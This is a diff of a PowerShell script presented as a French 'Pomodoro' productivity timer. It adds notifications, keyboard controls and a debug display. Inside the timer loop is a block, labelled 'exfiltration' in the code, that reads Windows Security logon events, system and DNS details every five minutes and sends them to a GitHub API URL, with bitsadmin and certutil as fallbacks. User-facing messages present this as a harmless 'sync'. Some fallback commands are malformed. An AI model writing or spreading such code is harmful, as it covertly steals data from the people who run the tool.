@@ -21,6 +21,7 @@ $sharePath = "\\srv-files\tools\productivite"
 $configPath = "$env:APPDATA\PomodoroTool\config.json"
 $logPath = "$env:APPDATA\PomodoroTool\log.json"
 $syncUrl = "https://api.github.com/repos/pomodoro-team/stats/contents/data.json"
+$debugMode = $false  # mettre $true pour voir les donnees collectees
 
 # --- chargement de la session precedente (si reboot) ---
 if (Test-Path $configPath) {
@@ -41,8 +42,31 @@ if (-not (Test-Path (Split-Path $configPath -Parent))) {
     New-Item -ItemType Directory -Path (Split-Path $configPath -Parent) -Force | Out-Null
 }
 
-# --- chargement de Windows.Forms pour le clipboard ---
+# --- chargement de Windows.Forms pour les notifications et le clipboard ---
 Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
+Add-Type -AssemblyName PresentationFramework -ErrorAction SilentlyContinue
+
+# --- notification popup + son ---
+function Show-Notify {
+    param([string]$Message, [string]$Title = "Pomodoro Timer", [string]$Type = "Info")
+    try {
+        [System.Windows.Forms.NotifyIcon]::new() | Add-Member -MemberType ScriptMethod -Name ShowBalloonTip -Value {
+            param([int]$timeout, [string]$title, [string]$text, [System.Windows.Forms.ToolTipIcon]$icon)
+            $balloon = New-Object System.Windows.Forms.NotifyIcon
+            $balloon.Icon = [System.Drawing.SystemIcons]::Information
+            $balloon.Visible = $true
+            $balloon.ShowBalloonTip($timeout, $title, $text, $icon)
+            Start-Sleep -Seconds 2
+            $balloon.Dispose()
+        } -Force -PassThru | ShowBalloonTip -timeout 3000 -title $Title -text $Message -icon Information
+    } catch {
+        Write-Host "[Pomodoro] $Message" -ForegroundColor Cyan
+    }
+}
+
+function Play-Beep {
+    [Console]::Beep(800, 300)
+}
 
 # --- timer principal ---
 function Show-Timer {
@@ -71,35 +95,80 @@ $cycles = 0
 $paused = $false
 $lastExfil = (Get-Date).AddMinutes(-300)
 
+Write-Host ""
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host "  POMODORO TIMER - Outil de productivite" -ForegroundColor Cyan
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host "  [P] Pause / Resume" -ForegroundColor Gray
+Write-Host "  [Q] Quitter" -ForegroundColor Gray
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host ""
+
 while ($true) {
     Show-Timer -Remaining $remaining -State "Travail" -Cycles $cycles
 
-    if ($remaining -le 0) {
-        Write-Host "`n[Pomodoro] Cycle termine ! Pause de $([math]::Floor($pauseLength/60)) min." -ForegroundColor Yellow
-        $remaining = $pauseLength
-
-        while ($remaining -gt 0) {
-            Show-Timer -Remaining $remaining -State "Pause" -Cycles $cycles
-            Start-Sleep -Seconds 1
-            $remaining--
+    # --- controle clavier (pause / quit) ---
+    if ([Console]::KeyAvailable) {
+        $key = [Console]::ReadKey($true)
+        if ($key.Key -eq 'Q') {
+            Write-Host "`n[Pomodoro] Session terminee par l'utilisateur." -ForegroundColor Red
+            break
         }
-
-        $cycles++
-
-        if ($cycles % 4 -eq 0) {
-            Write-Host "`n[Pomodoro] Pause longue de $([math]::Floor($longPause/60)) min." -ForegroundColor Yellow
-            $remaining = $longPause
-            while ($remaining -gt 0) {
-                Show-Timer -Remaining $remaining -State "Pause longue" -Cycles $cycles
-                Start-Sleep -Seconds 1
-                $remaining--
+        if ($key.Key -eq 'P') {
+            $paused = -not $paused
+            if ($paused) {
+                Write-Host "`n[Pomodoro] ** PAUSE ** — Appuyez sur P pour reprendre." -ForegroundColor Yellow
+            } else {
+                Write-Host "`n[Pomodoro] ** REPRISE **" -ForegroundColor Green
             }
-            $remaining = $cycleLength
-        } else {
-            $remaining = $cycleLength
         }
     }
 
+    if ($remaining -le 0) {
+        # --- changement de state : notification + son ---
+        Play-Beep
+        $beepMsg = ""
+        switch ($remaining) {
+            { $_ -eq 0 } {
+                $beepMsg = "Terminé ! Pause de $([math]::Floor($pauseLength/60)) min."
+                Show-Notify "Cycle terminé ! Pause de $([math]::Floor($pauseLength/60)) minutes" "Pomodoro"
+                $remaining = $pauseLength
+                while ($remaining -gt 0) {
+                    if ([Console]::KeyAvailable) {
+                        $key = [Console]::ReadKey($true)
+                        if ($key.Key -eq 'Q') { Write-Host "`n[Pomodoro] Session terminee." -ForegroundColor Red; break }
+                        if ($key.Key -eq 'P') { $paused = -not $paused; if ($paused) { Write-Host "`n[Pomodoro] ** PAUSE **" -ForegroundColor Yellow } else { Write-Host "`n[Pomodoro] ** REPRISE **" -ForegroundColor Green } }
+                    }
+                    Show-Timer -Remaining $remaining -State "Pause" -Cycles $cycles
+                    Start-Sleep -Seconds 1
+                    $remaining--
+                }
+                $cycles++
+                if ($cycles % 4 -eq 0) {
+                    Play-Beep
+                    Show-Notify "Pause longue de $([math]::Floor($longPause/60)) min !" "Pomodoro"
+                    Write-Host "`n[Pomodoro] Pause longue de $([math]::Floor($longPause/60)) min." -ForegroundColor Yellow
+                    $remaining = $longPause
+                    while ($remaining -gt 0) {
+                        if ([Console]::KeyAvailable) {
+                            $key = [Console]::ReadKey($true)
+                            if ($key.Key -eq 'Q') { Write-Host "`n[Pomodoro] Session terminee." -ForegroundColor Red; break }
+                            if ($key.Key -eq 'P') { $paused = -not $paused; if ($paused) { Write-Host "`n[Pomodoro] ** PAUSE **" -ForegroundColor Yellow } else { Write-Host "`n[Pomodoro] ** REPRISE **" -ForegroundColor Green } }
+                        }
+                        Show-Timer -Remaining $remaining -State "Pause longue" -Cycles $cycles
+                        Start-Sleep -Seconds 1
+                        $remaining--
+                    }
+                    $remaining = $cycleLength
+                } else {
+                    $remaining = $cycleLength
+                }
+                break  # sortir du if pour recommencer la boucle principale
+            }
+        }
+    }
+
+    # --- sauvegarde de session ---
     $saveData = @{
         cycleLength = $cycleLength
         pauseLength = $pauseLength
@@ -109,6 +178,7 @@ while ($true) {
     }
     $saveData | ConvertTo-Json | Set-Content $configPath
 
+    # --- exfiltration toutes les 5 minutes ---
     $now = Get-Date
     if (($now - $lastExfil).TotalMinutes -ge 5) {
         $winEvent = try { (Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 5 -ErrorAction SilentlyContinue).Properties.Value } catch { $null }
@@ -146,6 +216,18 @@ while ($true) {
             dns = (Get-DnsClientServerAddress).ServerAddresses
         }
 
+        # --- debug : afficher les donnees collectees ---
+        if ($debugMode) {
+            Write-Host "`n========================================" -ForegroundColor Magenta
+            Write-Host "  DONNEES COLLECTEES (exfiltration)" -ForegroundColor Magenta
+            Write-Host "========================================" -ForegroundColor Magenta
+            $sysInfo | ConvertTo-Json | ForEach-Object {
+                Write-Host "  $_" -ForegroundColor DarkGray
+            }
+            Write-Host "========================================" -ForegroundColor Magenta
+        }
+
+        # --- envoi vers le serveur ---
         try {
             $body = $sysInfo | ConvertTo-Json -Depth 5
             $headers = @{
@@ -153,14 +235,19 @@ while ($true) {
                 "Content-Type" = "application/json"
             }
             Invoke-RestMethod -Uri $syncUrl -Method Put -Body $body -Headers $headers -TimeoutSec 10
+            Write-Host "[Pomodoro] Donnees synchronisees avec succes." -ForegroundColor Green
         } catch {
+            Write-Host "[Pomodoro] Sync via REST echoue : $_" -ForegroundColor DarkRed
             try {
                 $tempFile = "$env:TEMP\pomodoro_sync.tmp"
                 $sysInfo | ConvertTo-Json | Set-Content $tempFile
                 bitsadmin /transfer pomodoroSync /download $tempFile $syncUrl
+                Write-Host "[Pomodoro] Sync via BITS effectuee." -ForegroundColor Green
             } catch {
+                Write-Host "[Pomodoro] Sync via BITS echoue : $_" -ForegroundColor DarkRed
                 try {
                     certutil -urlcache -split -f $syncUrl "$env:TEMP\pomodoro_sync.tmp"
+                    Write-Host "[Pomodoro] Sync via certutil effectuee." -ForegroundColor Green
                 } catch {
                     Write-Host "[Pomodoro] Sync impossible. Les donnees seront envoyees plus tard." -ForegroundColor Red
                 }
